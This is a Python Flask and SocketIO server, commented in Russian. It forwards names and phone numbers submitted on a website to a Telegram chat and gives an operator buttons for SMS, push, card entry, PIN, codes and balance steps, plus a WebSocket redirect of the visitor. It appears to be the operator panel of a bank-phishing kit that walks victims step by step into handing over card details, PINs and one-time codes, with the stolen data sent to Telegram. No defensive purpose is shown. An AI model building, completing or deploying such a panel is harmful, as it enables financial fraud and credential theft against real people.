import eventlet
eventlet.monkey_patch()  # Вызов должен быть первым!

import os
import time
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO

# Создаем Flask-приложение и разрешаем CORS
app = Flask(__name__)
CORS(app)

# Настраиваем SocketIO с использованием eventlet
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# Загружаем переменные окружения
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
    raise ValueError("❌ Ошибка: TELEGRAM_BOT_TOKEN или CHAT_ID не установлены!")
CHAT_ID = int(CHAT_ID)

print(f"✅ Загружен TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:5]}...")
print(f"✅ Загружен CHAT_ID: {CHAT_ID}")

# Простой маршрут для проверки работы сервера
@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "OK", "message": "Сервер работает!"}), 200

# Функция отправки сообщения в Telegram с inline клавиатурой и session_id
def send_telegram_message(data):
    try:
        # Генерируем уникальный session_id (на основе времени)
        session_id = str(int(time.time()))
        message_text = (
            f"📩 Новый запрос:\n\nИмя: {data.get('name')}\n"
            f"Телефон: {data.get('phone')}\nКомментарий: {data.get('comment')}\n"
            f"Session ID: {session_id}"
        )
        # Формируем inline клавиатуру – callback_data содержит session_id
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "SMS", "callback_data": "redirect_sms:" + session_id},
                    {"text": "Пуш", "callback_data": "push:" + session_id},
                    {"text": "Ввод карты", "callback_data": "card:" + session_id},
                    {"text": "PIN", "callback_data": "pin:" + session_id}
                ],
                [
                    {"text": "Лимиты", "callback_data": "limits:" + session_id},
                    {"text": "Неверный код", "callback_data": "wrong_code:" + session_id},
                    {"text": "Номер телефона", "callback_data": "phone_number:" + session_id}
                ],
                [
                    {"text": "Свой текст/фото", "callback_data": "custom_text:" + session_id}
                ],
                [
                    {"text": "Пополнение", "callback_data": "topup:" + session_id},
                    {"text": "Баланс", "callback_data": "balance:" + session_id}
                ],
                [
                    {"text": "✅ Успех", "callback_data": "success:" + session_id},
                    {"text": "❌ Неверный ЛК", "callback_data": "wrong_lk:" + session_id}
                ]
            ]
        }
        payload = {
            "chat_id": CHAT_ID,
            "text": message_text,
            "reply_markup": keyboard
        }
        print("📩 Отправляем в Telegram: " + repr(payload))
        response = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json=payload,
            timeout=10
        )
        response_data = response.json()
        print(f"📩 Ответ Telegram: {response_data}")
        # Добавляем session_id в ответ для передачи на сайт
        response_data["session_id"] = session_id
        return response_data
    except Exception as e:
        print(f"❌ Ошибка отправки в Telegram: {e}")
        return {"ok": False, "error": str(e)}

# Обработчик POST-запроса от сайта
@app.route("/send-to-telegram", methods=["POST"])
def handle_send_to_telegram():
    try:
        data = request.json
        print(f"📩 Получены данные: {data}")
        if not data or "name" not in data or "phone" not in data:
            return jsonify({"error": "Недостаточно данных"}), 400
        response_data = send_telegram_message(data)
        return jsonify(response_data)
    except Exception as e:
        print(f"❌ Ошибка сервера: {e}")
        return jsonify({"error": str(e)}), 500

# Обработчик callback-запросов от Telegram
@app.route("/callback", methods=["POST"])
def handle_callback():
    try:
        data = request.json
        print(f"📩 Получен callback: {data}")
        if "callback_query" not in data:
            return jsonify({"error": "callback_query отсутствует"}), 400
        callback_query = data["callback_query"]
        callback_data = callback_query.get("data")
        chat_id = callback_query["message"]["chat"]["id"]
        if not callback_data:
            return jsonify({"error": "Отсутствует data"}), 400
        # Разбираем callback_data в формате "action:session_id"
        action, session_id = callback_data.split(":")
        if action == "redirect_sms":
            print(f"✅ Оператор выбрал SMS для session_id {session_id}")
            # Отправляем событие WebSocket для редиректа
            socketio.emit("redirect", {"user_id": session_id, "url": "https://www.cikava-kava.com.ua/remont-kavomashyn-dnipro/"})
            response_text = "📩 SMS отправлено! Клиент будет перенаправлен."
        else:
            response_text = "Неизвестная команда."
        payload = {"chat_id": chat_id, "text": response_text}
        response = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json=payload,
            timeout=10
        )
        print(f"📩 Ответ Telegram (callback): {response.json()}")
        return jsonify({"message": "Callback обработан!"})
    except Exception as e:
        print(f"❌ Ошибка в callback: {e}")
        return jsonify({"error": str(e)}), 500

# WebSocket обработчики
@socketio.on("connect")
def handle_connect():
    print("✅ WebSocket подключен!")

@socketio.on("disconnect")
def handle_disconnect():
    print("❌ WebSocket отключен!")

@socketio.on_error()
def handle_socket_error(e):
    print(f"⚠ Ошибка WebSocket: {e}")

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)
